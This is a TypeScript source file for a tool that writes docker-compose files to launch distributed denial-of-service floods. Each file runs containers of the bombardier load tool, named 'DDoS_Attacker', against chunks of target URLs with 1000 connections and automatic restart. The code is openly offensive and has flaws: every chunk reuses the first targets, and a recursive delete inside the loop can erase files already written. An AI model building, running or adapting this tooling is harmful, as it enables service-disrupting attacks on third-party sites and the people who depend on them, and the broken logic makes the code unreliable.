import fs from "fs";
import _ from "lodash";

/**
 * This is used to generate and save file for attack
 */
export class FileGenerator {
    private targets: string[] = [];

    private countPerChunk = 10; //Count of targets per docker-file
    private SAVE_DIR = 'attackTargets/lists';
    private FILE_NAME = 'docker-compose.yml';

    constructor(options: {
        targets: string[],
    }) {
        this.targets = options.targets;
    }

    public generateAndSave() {
        const chunks = _.chunk(this.targets, this.countPerChunk);

        chunks.forEach((chunk:string[], chunkIndex: number) => {
            const directory = this.SAVE_DIR + `/list_${chunkIndex}`;
            const filepath = `${directory}/` + this.FILE_NAME;
            let fileContent = "";

            fileContent+= "version: \"3.9\"\n";
            fileContent+= "services:\n";

            for (let i = 0; i < chunk.length; i++) {
                fileContent+= `\ts${i}:\n`;
                fileContent+= "\t\timage: alpine/bombardier\n";
                fileContent+= `\t\tcontainer_name: \"DDoS_Attacker_${i}\"\n`;
                fileContent+= `\t\tcommand: [ \"-c\", \"1000\", \"-d\", \"60s\", \"-l\", \"${this.targets[i]}\" ]\n`;
                fileContent+= "\t\trestart: \"always\"\n";
            }

            console.log('Saving into file: ', filepath);
            // Remove old files
            fs.rm(this.SAVE_DIR, {recursive: true}, () => {
                // Creates directory if it is missing
                fs.mkdir(directory, { recursive: true }, (err) => {
                    if (err) throw err;

                    //Save file
                    fs.writeFileSync(filepath, fileContent);
                });
            })
        });
    }
}
